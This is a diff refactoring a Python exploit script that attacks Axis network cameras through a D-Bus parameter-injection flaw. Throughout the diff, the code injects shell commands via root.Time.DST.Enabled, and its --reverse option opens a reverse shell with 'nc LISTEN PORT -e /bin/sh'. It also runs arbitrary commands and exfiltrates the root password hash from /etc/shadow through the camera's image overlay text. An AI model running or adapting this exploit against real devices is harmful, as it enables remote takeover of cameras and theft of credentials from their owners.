@@ -26,31 +26,39 @@ def logging(message: str):
         print(message, end="")
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-a", "--auto", action="store_true", help="Auto mode (do not prompt for listener)")
-parser.add_argument("-e", "--exfil", action="store_true", help="Exfiltrate root password hash from shadow with image text overlay")
-parser.add_argument("-c", "--command", type=str, help="Command to run (default: 'nc [LISTEN] [LISTEN_PORT] -e /bin/sh')")
-parser.add_argument("-f", "--file", type=str, help="Target file path (default: index.shtml)")
-parser.add_argument("-i", "--overlay-only", action="store_true", help="Only modify image overlay text and exit")
-parser.add_argument("-l", "--listen", type=str, help="Listener IP (default: response from http://checkip.amazonaws.com)")
-parser.add_argument("-lp", "--listen-port", type=int, help="Listener port (default: 1337)")
-parser.add_argument("-o", "--overlay", type=str, help="Image overlay text (optional)")
-parser.add_argument("-p", "--proxy", type=str, help="Proxy to send requests in URL form 'http://IPADDRESS:PORT' (optional)")
-parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode (no prompt, no output)")
-parser.add_argument("-s", "--https", action="store_true", help="HTTPS")
-parser.add_argument("-t", "--target", type=str, required=True, help="Target device IP")
-parser.add_argument("-tp", "--target-port", type=int, help="Target device port (default: 80)")
-parser.add_argument("-x", "--test", action="store_true", help="Test for vulnerability only")
+# Basic arguments
+parser.add_argument("-a",   "--auto", action="store_true", help="Auto mode (do not prompt for listener)")
+parser.add_argument("-q",   "--quiet", action="store_true", help="Quiet mode (no prompt, no output)")
+parser.add_argument("-x",   "--test", action="store_true", help="Test for vulnerability only")
+parser.add_argument("-T",   "--target", type=str, required=True, help="Target device IP")
+parser.add_argument("-TP",  "--target-port", type=int, help="Target device port", default="80")
+parser.add_argument("-L",   "--listen", type=str, help="Listener IP (if not specified, response from http://checkip.amazonaws.com)")
+parser.add_argument("-LP",  "--listen-port", type=int, help="Listener port", default="1337")
+
+# Overlay arguments
+#parser.add_argument("-o",   "--overlay", action="store_true", help="Modify image overlay text")
+parser.add_argument("-ot",   "--overlay-text", type=str, help="Specify image overlay text")
+parser.add_argument("-ol",   "--overlay-leak", action="store_true", help="Exfiltrate root password hash from shadow with image text overlay")
+
+# Non-overlay command arguments
+parser.add_argument("-r",   "--reverse", action="store_true", help="Request reverse shell from target (nc [LISTEN] [LISTEN_PORT] -e /bin/sh)")
+parser.add_argument("-e",   "--execute", type=str, help="Execute command (OVERRIDES --reverse)")
+
+# Special Connection arguments
+parser.add_argument("-f",   "--target-path", type=str, help="Target file path", default="index.shtml")
+parser.add_argument("-p",   "--proxy", type=str, help="Proxy to send requests in URL form 'http://IPADDRESS:PORT' (optional)")
+# parser.add_argument("-s",   "--https", action="store_true", help="HTTPS")
 
 args = parser.parse_args()
 
 # Set some default values
 target_ip = args.target
-target_port = 80
-target_file = "index.shtml"
+#target_port = 80
+#target_file = "index.shtml"
 target_proto = "http"
 listen_ip = ""
 listen_port = 1337
-overlay_text = ""
+overlay_text = None
 req_proxy = ""
 
 # Process arguments
@@ -73,23 +81,34 @@ else:
 if (args.listen_port != None):
     listen_port = args.listen_port
 
-if (args.file != None):
-    target_file = args.file
+if (args.target_path != None):
+    target_file = args.target_path
 
-if (args.https):
-    target_proto = "https"
+# if (args.https):
+#     target_proto = "https"
 
-if (args.overlay):
-    overlay_text = args.overlay
+if (args.overlay_text != None and args.overlay_leak):
+    logging(f"Cannot use --overlay-text (Overlay text) and --overlay-leak (Leak) simutaneously.\n")
+    exit(1)
 
-if (args.command):
-    cmd = f"{args.command}"
+if (args.overlay_text != None):
+    overlay_text = args.overlay_text
+
+if (args.execute != None):
+    exe_cmd = f"{args.execute}"
 else:
-    cmd = f"nc {listen_ip} {listen_port} -e /bin/sh"
+    if (args.reverse):
+        exe_cmd = f"nc {listen_ip} {listen_port} -e /bin/sh"
 
-logging(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\nProxy: {req_proxy}\nCommand: {cmd}\n")
+if (args.execute != None and args.reverse):
+    logging(f"Reverse and Execute specified:\n\tOverriding --reverse command with --execute command.\n")
+
+logging(f"Configuration\n-------------\nTarget: {target_proto}://{target_ip}:{target_port}/{target_file}\nListener: {listen_ip}:{listen_port}\nOverlay: {overlay_text}\nProxy: {req_proxy}\n")
+if (args.reverse or args.execute != None):
+    logging(f"Command: {exe_cmd}\n")
 logging(f"\n")
-# Character generation
+
+# Character generator
 def gen_chars(count: int) -> str:
     letters = ''.join(random.choice(string.ascii_lowercase) for i in range(count))
     return letters
@@ -133,7 +152,7 @@ def http_check(req: requests, test: bool = False) -> int:
 
 target_url = f"{target_proto}://{target_ip}:{target_port}/{target_file}/{gen_chars(1)}.srv"
 
-# Test for possible exploitation
+# Test for possible device exploitation
 def test_connect():
     global stage
     TEST_DATA = {
@@ -142,9 +161,18 @@ def test_connect():
     }
     
     logging(f"+ Testing connection to device...\t\t\t\t")
-    
     if http_check(requests.post(f"{target_url}", data=TEST_DATA, proxies=req_proxy, allow_redirects=False), True):
         exit(1)
+
+
+"""
+    Request, Sync and Sanity
+"""
+# Send request
+def send_req(req_data: dict):
+    if http_check(requests.post(f"{target_url}", data=req_data, proxies=req_proxy, allow_redirects=False)):
+        exit(1)
+
 
 # Sync modifications
 def sync_req():
@@ -154,78 +182,13 @@ def sync_req():
     }
     
     logging(f"Syncing parameters...\t\t\t\t\t\t")
-    
-    if http_check(requests.post(f"{target_url}", data=SYNC_DATA, proxies=req_proxy, allow_redirects=False)):
-        exit(1)
-    
+    send_req(SYNC_DATA)
+    # if http_check(requests.post(f"{target_url}", data=SYNC_DATA, proxies=req_proxy, allow_redirects=False)):
+    #     exit(1)
     sleep(1)
 
-# Attempts to modify image overlay
-def overlay_req():
-    global stage
-
-    OVERLAY_DATA = {
-        'action': "dbus",
-        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.TextEnabled string:yes",
-    }
-
-    logging(f"Stage {stage}: Attempt to enable image overlay text...\t\t")
-
-
-    if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
-        exit(1)
-
-    OVERLAY_DATA = {
-        'action': "dbus",
-        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:{overlay_text}",
-    }
-
-    logging(f"Stage {stage}: Attempt to modify image overlay text...\t\t")
-
-    if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
-        exit(1)
-
-    sync_req()
-
-    stage += 1
-
-
-# Leak info via text overlay
-def overlay_leak():
-    global stage
-
-    # overlay_leak_cmd = 'sed -ir \"s\|ABCD\|$(grep \'root\' /etc/shadow | cut \'-d:\' -f2)\|g\" /etc/sysconfig/image_text.conf'
-    
-    overlay_leak_cmd = 'uname'
-
-    overlay_leak_cmd_ifs = overlay_leak_cmd.replace(' ', "${IFS}")
-
-    # OVERLAY_DATA = {
-    #     'action': "dbus",
-    #     'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({overlay_leak_cmd_ifs})&",
-    # }
-
-    OVERLAY_DATA = {
-        'action': "dbus",
-        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:{overlay_leak_cmd_ifs}",
-    }
-
-
-    logging(f"Stage {stage}: Testing image overlay exfil...\t\t")
-
-    # print(f"{overlay_leak_cmd_ifs}")
-    # exit(0)
-
-    if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
-        exit(1)
-
-    sync_req()
-
-    stage += 1
-
-
-# Changes root.Time.DST.Enabled to 'True' for a baseline value
-def command_reset_req():
+# Reset root.Time.DST.Enabled to 'yes' for a baseline value
+def dst_reset_req():
     global stage
     RESET_DATA = {
         'action': "dbus",
@@ -233,30 +196,109 @@ def command_reset_req():
     }
     
     logging(f"Stage {stage}: Resetting root.Time.DST.Enabled\t\t\t")
-    if http_check(requests.post(f"{target_url}", data=RESET_DATA, proxies=req_proxy, allow_redirects=False)):
-        exit(1)
-    
+    # if http_check(requests.post(f"{target_url}", data=RESET_DATA, proxies=req_proxy, allow_redirects=False)):
+    #     exit(1)
+    send_req(RESET_DATA)
     sync_req()
-
     stage += 1   
 
-# Inject command into root.Time.DST.Enabled via dbus exploit    
-def command_req():
+
+"""
+    Overlay functions
+"""
+
+# Enable Image.I0.Text.TextEnabled overlay
+def overlay_enable():
     global stage
-    cmd_ifs = cmd.replace(' ', "${IFS}")
+    OVERLAY_DATA = {
+        'action': "dbus",
+        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.TextEnabled string:yes",
+    }
+
+    logging(f"Stage {stage}: Attempt to enable image overlay text...\t\t")
+    # if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
+    #     exit(1)
+    send_req(OVERLAY_DATA)
+    sync_req()
+    
+
+# Modify Image.I0.Text.String overlay
+def overlay_req():
+    global stage
+
+    overlay_enable()
+
+    OVERLAY_DATA = {
+        'action': "dbus",
+        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:{overlay_text}",
+    }
+
+    logging(f"Stage {stage}: Attempt to modify image overlay text...\t\t")
+    # if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
+    #     exit(1)
+    send_req(OVERLAY_DATA)
+    sync_req()
+    stage += 1
+
+
+# Modify Image.I0.Text.String to leak data
+def overlay_leak():
+    global stage
+
+    overlay_enable()
+    
+    # if (cmd == ""):
+    #     cmd = "$(grep 'root' /etc/shadow | cut '-d:' -f2)"
+    
+    # print(f"leak command: {cmd}")
+    # exit(0)
+    
+    # leak_cmd = 'sed -ir \"s\|ABCD\|$(grep \'root\' /etc/shadow | cut \'-d:\' -f2)\|g\" /etc/sysconfig/image_text.conf'
+    leak_cmd = "$(grep 'root' /etc/shadow | cut '-d:' -f2)"
+    overlay_leak_cmd = f"gdbus call --system --dest com.axis.PolicyKitParhand --object-path /com/axis/PolicyKitParhand --method com.axis.PolicyKitParhand.SetParameter Image.I0.Text.String {leak_cmd}"
+    overlay_leak_cmd_ifs = overlay_leak_cmd.replace(' ', "${IFS}")
+
+    OVERLAY_DATA = {
+        'action': "dbus",
+        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({overlay_leak_cmd_ifs})&",
+    }
+
+    logging(f"Stage {stage}: Modifying image text overlay...\t\t\t")
+    # print(f"{overlay_leak_cmd_ifs}")
+    # exit(0)
+
+    # if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
+    #     exit(1)
+    send_req(OVERLAY_DATA)
+    sleep(1)
+    sync_req()
+    dst_reset_req()
+    stage += 1
+
+"""
+    Command functions
+"""
+
+# Inject command into root.Time.DST.Enabled via dbus exploit    
+def dst_command_req():
+    global stage
+    
+    cmd_ifs = exe_cmd.replace(' ', "${IFS}")
+    
     COMMAND_DATA = {
         'action': "dbus",
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({cmd_ifs})&",
     }
     
     logging(f"Stage {stage}: Injecting command to root.Time.DST.Enabled...\t\t")
-    if http_check(requests.post(f"{target_url}", data=COMMAND_DATA, proxies=req_proxy, allow_redirects=False)):
-        exit(1)
-
+    # if http_check(requests.post(f"{target_url}", data=COMMAND_DATA, proxies=req_proxy, allow_redirects=False)):
+    #     exit(1)
+    send_req(COMMAND_DATA)
     logging("+ Running sync to execute command\n")
     sync_req()
-
+    dst_reset_req()
     stage += 1
+
 
 def main():
 
@@ -264,29 +306,20 @@ def main():
 
     if (args.test):
         exit(0)
-  
-    logging("+ Preparing to execute exploit.\n")
+
+#    logging("+ Preparing to execute exploit.\n")
       
-    if (overlay_text != ""):
+    if (overlay_text != None):
         overlay_req()
 
-        if (args.exfil):
-            overlay_leak()
+    if (args.overlay_leak):
+        overlay_leak()
 
-
-
-    if (args.overlay_only):
-        exit(0)
-
-    if not args.quiet:
-        if not args.auto:
-            input("= Start listener and press Enter to continue...")
-    
-    command_reset_req()
-    
-    command_req()
-    
-    command_reset_req()
+    if (args.reverse or args.execute != None):
+        if not args.quiet:
+            if not args.auto:
+                input("= Start listener and press Enter to continue...")
+        dst_command_req()
     
 
 if __name__ == "__main__":
